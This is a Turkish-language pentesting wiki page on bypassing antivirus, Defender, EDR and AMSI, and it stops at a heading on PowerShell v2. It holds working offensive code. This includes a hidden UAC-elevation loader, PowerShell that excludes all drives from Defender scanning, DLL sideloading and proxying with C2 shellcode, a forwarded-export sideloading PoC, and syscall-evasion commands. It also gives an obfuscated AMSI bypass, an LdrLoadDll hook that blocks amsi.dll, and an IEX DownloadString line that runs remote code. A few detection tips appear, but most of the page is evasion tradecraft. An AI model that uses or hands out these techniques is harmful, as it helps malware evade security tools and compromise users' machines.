# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p)** tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durduran bir araç.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durduran bir araç.
- [Yöneticiyseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce yükleyici tarzı UAC tuzağı

Oyun hilesi gibi görünen herkese açık loader'lar genellikle önce **kullanıcıdan yükseltilmiş izin ister**, ancak bundan sonra Defender'ı etkisiz hâle getiren imzasız Node.js/Nexe yükleyicileri olarak dağıtılır. İşleyiş basittir:

1. `net session` ile yönetici bağlamı olup olmadığını kontrol edin. Komut yalnızca çağıran yönetici haklarına sahipse başarılı olur; dolayısıyla başarısız olması loader'ın standart kullanıcı olarak çalıştığını gösterir.
2. Özgün komut satırını korurken beklenen UAC onay istemini tetiklemek için kendisini hemen `RunAs` fiiliyle yeniden başlatın.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Kurbanlar zaten “crack’li” yazılım yüklediklerine inandığından istem genellikle kabul edilir ve malware, Defender’ın politikasını değiştirmek için ihtiyaç duyduğu izinleri alır.<sup>[[26]](#references)</sup>

### Her sürücü harfi için genel `MpPreference` dışlamaları

Yetki yükseltildikten sonra GachiLoader tarzı zincirler, hizmeti doğrudan devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’unu sonlandırır (`taskkill /F /IM SecHealthUI.exe`), ardından her kullanıcı profilinin, sistem dizininin ve çıkarılabilir diskin taranmasını engellemek için **son derece geniş dışlamalar** ekler:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Key observations:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılan **gelecekteki payload’lar yok sayılır**.
- `.sys` uzantısı istisnası ileriye dönüktür: saldırganlar, Defender’a yeniden dokunmadan daha sonra imzasız driver’ları yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır. Böylece sonraki aşamalar, UAC’yi yeniden tetiklemeden istisnaların kalıcı olduğunu doğrulayabilir veya kapsamını genişletebilir.

Hiçbir Defender hizmeti durdurulmadığından, basit sağlık kontrolleri “antivirus active” raporlamaya devam eder; oysa gerçek zamanlı inceleme bu yolları hiçbir zaman denetlemez.<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

Günümüzde AV’ler, bir dosyanın kötü amaçlı olup olmadığını denetlemek için farklı yöntemler kullanır: statik tespit, dinamik analiz ve daha gelişmiş EDR’lerde davranış analizi.

### **Statik tespit**

Statik tespit; bir binary veya script içindeki bilinen kötü amaçlı dizeleri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgi çıkararak (ör. dosya açıklaması, şirket adı, dijital imzalar, simge, checksum vb.) gerçekleştirilir. Bu nedenle bilinen public araçları kullanmak daha kolay yakalanmanıza yol açabilir; çünkü bu araçlar muhtemelen analiz edilip kötü amaçlı olarak işaretlenmiştir. Bu tür bir tespiti aşmanın birkaç yolu vardır:

- **Encryption**

Binary’yi şifrelerseniz AV’nin programınızı tespit etmesi mümkün olmaz; ancak programın şifresini çözerek bellekte çalıştıracak bir loader gerekir.

- **Obfuscation**

Bazen AV’yi aşmak için binary veya script’inizdeki bazı dizeleri değiştirmeniz yeterlidir; ancak gizlemeye çalıştığınız şeye bağlı olarak bu zaman alıcı olabilir.

- **Custom tooling**

Kendi araçlarınızı geliştirirseniz bilinen kötü amaçlı imzalar bulunmaz; ancak bu çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender statik tespitine karşı kontrol yapmak için iyi bir yöntem [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanmaktır. Dosyayı birden fazla segmente böler ve ardından Defender’dan her birini ayrı ayrı taramasını ister; bu sayede binary’nizde işaretlenen dizeleri veya byte’ları tam olarak gösterir.

Pratik AV Evasion hakkında bu [YouTube oynatma listesini](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) incelemenizi şiddetle tavsiye ederim.

### Statik sınıflandırıcılar için çevrimdışı PE özellik testleri

Paketlenmiş veya şifrelenmiş payload byte’ları, statik sınıflandırıcının kullandığı girdilerden yalnızca biridir. EMBER2024; import’lar, export’lar, section’lar, header’lar ve Authenticode verileri dahil PE özelliklerini çıkarır.<sup>[[48]](#references)</sup> Bir loader deneyinde, zararsız görünen 141 import eklemek EMBER2024’ün kötü amaçlılık puanını %93 düşürürken, malware ile ilişkilendirilen import’lar puanı yükseltti. Bu sonuç, belirli bir AV/EDR ürününü güvenilir biçimde aşmanın değil, söz konusu model ve örneklerin sonucudur.<sup>[[50]](#references)</sup>

Yetkili bir loader testi için payload’ı ve yürütme yolunu sabit tutun, her varyantta amaçlanan tek bir build değişkenini değiştirin ve puanları çevrimdışı karşılaştırın. Build değişikliği birden fazla özellik grubunu etkileyebileceğinden, ortaya çıkan PE özelliklerini inceleyin.<sup>[[49]](#references)[[50]](#references)</sup> Amaçlanan import’ları IAT’de tutmak için seçilen Win32 API’lerini erişilebilir koddan çağırın. Sabit bir kamuflaj işlevinin imzaya dönüşmesi riskini önlemek için seçimleri çeşitlendirin ve çağrı noktalarını farklı build’lere dağıtın. Deneyde ayrıca geçerli code signing, export girdileri ve `.pdata` boyutunu artıran daha fazla işlev kullanıldığında puanların düştüğü; geçersiz imzalamanın etkisinin az olduğu ve `.pdata` etkisinin küçük kaldığı bildirildi.<sup>[[50]](#references)</sup>

`thrember` paketi özellik çıkarma ve benchmark modelleri sağlar. Paketi yükledikten sonra, mevcut bir `models` diziniyle `thrember.download_models("models")` komutunu kullanın; ardından puanlayıcıyı bu dizinin üst dizininden çalıştırın: indirme yardımcısı geçerli çalışma dizinini değiştirir. PE sınıflandırıcısı, build’lerden oluşan bir dizini bir tarama hizmetine göndermeden puanlayabilir:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Karşılaştırma sırasında model ve feature-extractor sürümlerini sabit tutun. Daha düşük bir offline score, yalnızca bu classifier'ın değiştirilen binary'ye nasıl tepki verdiğini gösterir; davranışsal analizden, emulation'dan veya bir vendor'ın farklı modelinden kaçıldığını kanıtlamaz.<sup>[[49]](#references)[[50]](#references)</sup> [Virtualized payload'larda build başına polymorphism ve dış binary camouflage](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) için ayrı execution modeline bakın.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox'ta çalıştırıp kötü amaçlı etkinlikleri (ör. tarayıcınızın parolalarını decrypt edip okumaya çalışmak, LSASS üzerinde minidump almak vb.) izlemesidir. Bu kısım biraz daha uğraştırıcı olabilir; ancak sandbox'lardan kaçınmak için yapabileceğiniz bazı şeyler şunlardır.

- **Çalıştırmadan önce bekleme** Nasıl uygulandığına bağlı olarak, AV'nin dynamic analysis'ini bypass etmenin harika bir yolu olabilir. AV'lerin, kullanıcının iş akışını kesintiye uğratmamak için dosyaları taramak üzere çok kısa bir süresi vardır; bu nedenle uzun süre beklemek binary analizini aksatabilir. Sorun şu ki, birçok AV sandbox'ı, nasıl uygulandığına bağlı olarak beklemeyi atlayabilir.
- **Makinenin kaynaklarını kontrol etme** Sandbox'ların genellikle kullanabilecekleri kaynaklar çok sınırlıdır (ör. < 2GB RAM); aksi takdirde kullanıcının makinesini yavaşlatabilirler. Burada yaratıcılığınızı da konuşturabilirsiniz; örneğin CPU sıcaklığını, hatta fan hızlarını kontrol edebilirsiniz. Bunların hepsi sandbox'ta uygulanmış olmayabilir.
- **Makineye özgü kontroller** "contoso.local" domain'ine katılmış bir iş istasyonuna sahip kullanıcıyı hedeflemek istiyorsanız, bilgisayarın domain'inin belirttiğinizle eşleşip eşleşmediğini kontrol edebilirsiniz. Eşleşmiyorsa programınızdan çıkabilirsiniz.

Microsoft Defender'ın Sandbox bilgisayar adının HAL9TH olduğu ortaya çıktı. Bu nedenle, malware'inizde detonation öncesinde bilgisayar adını kontrol edebilirsiniz. Ad HAL9TH ile eşleşiyorsa Defender'ın sandbox'ının içindesiniz demektir; bu durumda programınızdan çıkabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>kaynak: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandbox'lara karşı koymak için [@mgeeky](https://twitter.com/mariuszbit) tarafından verilen diğer faydalı ipuçları:

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanalı</p></figcaption></figure>

Bu yazıda daha önce de belirttiğimiz gibi, **public tools** er ya da geç **tespit edilir**. Bu nedenle kendinize şunu sormalısınız:

Örneğin, LSASS dump'ı almak istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS dump'ı alan başka bir proje kullanabilir misiniz?

Muhtemelen doğru yanıt ikincisidir. Örnek olarak mimikatz'ı ele alırsak, AV'ler ve EDR'ler tarafından en çok işaretlenen malware'lerden biridir; belki de en çok işaretlenenidir. Projenin kendisi son derece etkileyici olsa da, AV'leri aşmak için onunla çalışmak tam bir kâbustur. Bu nedenle, yapmak istediğiniz şey için alternatifleri araştırın.

> [!TIP]
> Payload'larınızı evasion için değiştirirken Defender'da **otomatik örnek gönderimini kapattığınızdan** emin olun. Ayrıca, uzun vadede evasion elde etmek istiyorsanız lütfen, gerçekten **VIRUSTOTAL'A YÜKLEMEYİN**. Payload'ınızın belirli bir AV tarafından tespit edilip edilmediğini kontrol etmek istiyorsanız, AV'yi bir VM'e kurun, otomatik örnek gönderimini kapatmaya çalışın ve sonuçtan memnun kalana kadar orada test edin.

## EXE'ler ve DLL'ler

Mümkün olduğunda, evasion için her zaman **DLL kullanmaya öncelik verin**. Deneyimlerime göre DLL dosyaları genellikle **çok daha az tespit edilir** ve analiz edilir. Bu nedenle bazı durumlarda tespit edilmekten kaçınmak için kullanabileceğiniz çok basit bir yöntemdir (tabii payload'ınızın DLL olarak çalıştırılmasının bir yolu varsa).

Bu görselde görebileceğimiz gibi, Havoc'un DLL Payload'ının antiscan.me'deki tespit oranı 4/26 iken EXE payload'ının tespit oranı 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me'de normal bir Havoc EXE payload'ı ile normal bir Havoc DLL'in karşılaştırması</p></figcaption></figure>

Şimdi, DLL dosyalarıyla çok daha gizli olmanızı sağlayacak bazı yöntemler göstereceğiz.

## DLL Sideloading ve Proxying

**DLL Sideloading**, victim application'ı ve kötü amaçlı payload'ları yan yana konumlandırarak loader'ın kullandığı DLL arama sırasından yararlanır.

DLL Sideloading'e açık programları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki PowerShell script'iyle kontrol edebilirsiniz:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e açık programların ve yüklemeye çalıştıkları DLL dosyalarının listesini verir.

**DLL Hijackable/Sideloadable programları kendiniz keşfetmenizi** şiddetle tavsiye ederim. Bu teknik doğru uygulandığında oldukça gizlidir; ancak herkese açık şekilde bilinen DLL Sideloadable programları kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği adla kötü amaçlı bir DLL yerleştirmek, payload'unuzu yüklemesini sağlamaz; çünkü program, o DLL'nin içinde belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, programın yaptığı çağrıları proxy (ve kötü amaçlı) DLL'den orijinal DLL'ye yönlendirir. Böylece programın işlevselliği korunurken payload'unuzun yürütülmesi de sağlanır.

[@flangvik](https://twitter.com/Flangvik/) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış özgün DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem shellcode'umuz ([SGN](https://github.com/EgeBalci/sgn) ile encode edildi) hem de proxy DLL, [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate değerine sahip! Buna başarı derim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t'ın Twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve ayrıca ele aldığımız konuları daha derinlemesine öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) **kesinlikle** izlemenizi öneririm.

### Forwarded Exports'u Kötüye Kullanma (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan fonksiyonları export edebilir: export girdisi kodu göstermek yerine `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir çağıran export'u çözümlerken Windows loader şunları yapar:

- Henüz yüklenmemişse `TargetDll`'yi yükler
- `TargetFunc`'ı ondan çözümler

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden sağlanır (ör. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- `TargetDll` bir KnownDLL değilse, modülün forward çözümlemesini yapan dizinini de içeren normal DLL arama sırası kullanılır.

Bu, dolaylı bir sideloading primitive'i sağlar: fonksiyonu KnownDLL olmayan bir modül adına forward edilen imzalı bir DLL bulun, ardından bu imzalı DLL'yi forward edilen hedef modülle tam olarak aynı ada sahip, saldırganın kontrolündeki bir DLL ile aynı dizine koyun. Forwarded export çağrıldığında loader forward'ı çözümler ve aynı dizinden DLL'nizi yükleyerek DllMain'inizi çalıştırır.<sup>[[13]](#references)</sup>

Windows 11'de gözlemlenen örnek:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll`, KnownDLL değildir; bu nedenle normal arama sırasına göre çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'ini yazılabilir bir klasöre kopyalayın.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Kod yürütülmesini sağlamak için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'ı uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) İmzalı bir LOLBin ile forward işlemini tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Gözlemlenen davranış:
- rundll32 (signed), side-by-side `keyiso.dll` dosyasını (signed) yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` yönlendirmesini izler
- Loader daha sonra `C:\test` konumundan `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatasını ancak `DllMain` çalıştıktan sonra alırsınız

Hunting ipuçları:
- Hedef modülün KnownDLL olmadığı forwarded export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded export'ları şu tür araçlarla listeleyebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Tespit/savunma fikirleri:
- LOLBins’in (örn. rundll32.exe) sistem dışı yollardan imzalı DLL’ler yüklemesini ve ardından aynı dizinden aynı temel ada sahip KnownDLLs olmayan dosyaları yüklemesini izleyin
- Şu tür işlem/modül zincirleri için uyarı oluşturun: `rundll32.exe` → sistem dışı `keyiso.dll` → kullanıcı tarafından yazılabilir yollardaki `NCRYPTPROV.dll`
- Kod bütünlüğü politikalarını (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde yazma+çalıştırma iznini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış süreçler, doğrudan syscalls ve alternatif yürütme yöntemleri kullanarak EDR’leri atlatmaya yönelik bir payload araç setidir`

Freeze’i shellcode’unuzu gizlice yükleyip çalıştırmak için kullanabilirsiniz.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion sadece bir kedi-fare oyunudur; bugün işe yarayan bir yöntem yarın tespit edilebilir. Bu yüzden asla tek bir araca güvenmeyin; mümkünse birden fazla evasion tekniğini zincirleme kullanmayı deneyin.

## Direct/Indirect Syscalls ve SSN Çözümleme (SysWhispers4)

EDR’lar genellikle `ntdll.dll` syscall stub’larına **user-mode inline hook’lar** yerleştirir. Bu hook’ları aşmak için doğru **SSN**’yi (System Service Number) yükleyen ve hook’lanmış export entrypoint’ini çalıştırmadan kernel mode’a geçen **direct** veya **indirect** syscall stub’ları oluşturabilirsiniz.<sup>[[32]](#references)</sup>

**Çağırma seçenekleri:**
- **Direct (embedded)**: oluşturulan stub’a `syscall`/`sysenter`/`SVC #0` talimatı ekler (`ntdll` export’una uğramaz).
- **Indirect**: kernel geçişinin `ntdll` kaynaklı görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget’ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrıda bir havuzdan gadget seçer.
- **Egg-hunt**: diskte statik `0F 05` opcode dizisini bulundurmaktan kaçınır; syscall dizisini runtime’da çözümler.

**Hook’lara dayanıklı SSN çözümleme stratejileri:**
- **FreshyCalls (VA sort)**: stub byte’larını okumak yerine syscall stub’larını virtual address’e göre sıralayarak SSN’leri çıkarır.
- **SyscallsFromDisk**: temiz bir `\KnownDlls\ntdll.dll` eşler, `.text` bölümünden SSN’leri okur ve ardından eşlemeyi kaldırır (bellekteki tüm hook’ları aşar).
- **RecycledGate**: VA sıralamalı SSN çıkarımını, stub temizken opcode doğrulamasıyla birleştirir; hook varsa VA çıkarımına geri döner.
- **HW Breakpoint**: `syscall` talimatına DR0 ayarlar ve hook’lanmış byte’ları ayrıştırmadan, runtime’da `EAX`’ten SSN’yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI, "[dosyasız malware](https://en.wikipedia.org/wiki/Fileless_malware)"ı önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu. Bu nedenle payload'ları bir şekilde **doğrudan bellekte** çalıştırabilirseniz, yeterli görünürlüğe sahip olmadığından AV bunu engellemek için hiçbir şey yapamazdı.

AMSI özelliği, Windows'un aşağıdaki bileşenlerine entegre edilmiştir.

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumunun yükseltilmesi)
- PowerShell (script'ler, etkileşimli kullanım ve dinamik kod değerlendirme)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA makroları

Antivirus çözümlerinin script davranışını incelemesini, script içeriklerini hem şifrelenmemiş hem de gizlenmemiş biçimde sunarak sağlar.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender'da aşağıdaki uyarıyı oluşturur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` ifadesini ve ardından script'in çalıştığı yürütülebilir dosyanın yolunu eklediğine dikkat edin. Bu örnekte bu dosya powershell.exe'dir.

Diske herhangi bir dosya bırakmadık, ancak AMSI nedeniyle yine de bellekte yakalandık.

Ayrıca **.NET 4.8** sürümünden itibaren C# kodu da AMSI üzerinden çalıştırılır. Bu, bellekte çalıştırma için `Assembly.Load(byte[])` kullanımını da etkiler. Bu nedenle AMSI'den kaçınmak istiyorsanız, bellekte çalıştırma için daha düşük .NET sürümlerini (4.7.2 veya altı gibi) kullanmanız önerilir.

AMSI'yi atlatmanın birkaç yolu vardır:

- **Obfuscation**

AMSI çoğunlukla statik tespit yöntemleriyle çalıştığından, yüklemeye çalıştığınız script'leri değiştirmek tespit edilmekten kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katmana sahip olsalar bile script'lerin obfuscation'ını çözebilir. Bu nedenle, nasıl yapıldığına bağlı olarak obfuscation kötü bir seçenek olabilir. Bu da tespitten kaçınmayı pek kolaylaştırmaz. Yine de bazen birkaç değişken adını değiştirmeniz yeterli olabilir; bu, içeriğin ne ölçüde işaretlendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) sürecine bir DLL yüklenerek uygulandığından, ayrıcalıksız bir kullanıcı olarak çalışırken bile kolayca kurcalanabilir. AMSI uygulamasındaki bu kusur nedeniyle araştırmacılar, AMSI taramasından kaçınmak için birden fazla yol bulmuştur.

**Hata Oluşturmaya Zorlama**

AMSI başlatma işleminin başarısız olmasını zorlamak (`amsiInitFailed`), geçerli süreç için tarama başlatılmamasına neden olur. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, yaygın kullanımını önlemek için bir imza geliştirdi.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI'yi mevcut PowerShell süreci için kullanılamaz hale getirmek tek bir PowerShell kod satırıyla mümkün oldu. Elbette bu satır AMSI tarafından tespit edildiğinden, bu tekniği kullanabilmek için bazı değişiklikler yapılması gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)'ten aldığım değiştirilmiş bir AMSI bypass.

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Bunun, bu gönderi yayımlandıktan sonra muhtemelen tespit edileceğini unutmayın. Bu nedenle, fark edilmeden kalmayı planlıyorsanız herhangi bir kod yayımlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi. Kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu olan amsi.dll içindeki "AmsiScanBuffer" işlevinin adresini bulup bu adresin üzerine E_INVALIDARG kodunu döndüren talimatlar yazmayı içerir. Böylece gerçek taramanın sonucu 0 döner ve bu, temiz bir sonuç olarak yorumlanır.

> [!TIP]
> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) sayfasını okuyun.

AMSI'yi powershell ile bypass etmek için kullanılan başka birçok teknik de var. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repoya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklenmesini engelleyerek AMSI'yi engelleme (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` mevcut sürece yüklendikten sonra başlatılır. Dilden bağımsız, sağlam bir bypass yöntemi; istenen modül `amsi.dll` olduğunda hata döndüren bir kullanıcı modu hook'unu `ntdll!LdrLoadDll` üzerine yerleştirmektir. Bunun sonucunda AMSI yüklenmez ve bu süreçte hiçbir tarama yapılmaz.<sup>[[23]](#references)</sup>

Uygulama taslağı (x64 C/C++ sözde kodu):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve özel loader'lar genelinde çalışır (aksi hâlde AMSI'yi yükleyecek her şeyde).
- Uzun komut satırı izlerinden kaçınmak için bunu script'leri stdin üzerinden göndermekle (`PowerShell.exe -NoProfile -NonInteractive -Command -`) birlikte kullanın.
- LOLBin'ler üzerinden çalıştırılan loader'larda kullanıldığı görülmüştür (ör. `regsvr32`'ün `DllRegisterServer` çağırması).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi atlatmak için script üretir.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da rastgeleleştirilmiş, kullanıcı tanımlı işlevler, değişkenler ve karakter ifadeleri kullanarak imzadan kaçınan; ayrıca imzadan kaçınmak için PowerShell anahtar sözcüklerinde karakterlerin büyük/küçük harf kullanımını rastgele değiştiren AMSI atlatma script'leri üretir.

**Tespit edilen imzayı kaldırma**

Geçerli işlemin belleğindeki tespit edilen AMSI imzasını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi araçlar kullanabilirsiniz. Bu araç, AMSI imzasını bulmak için geçerli işlemin belleğini tarar ve ardından üzerine NOP talimatları yazarak imzayı bellekten etkili bir şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** adresinde bulabilirsiniz.

**PowerShell sürüm 2'yi kullanma**
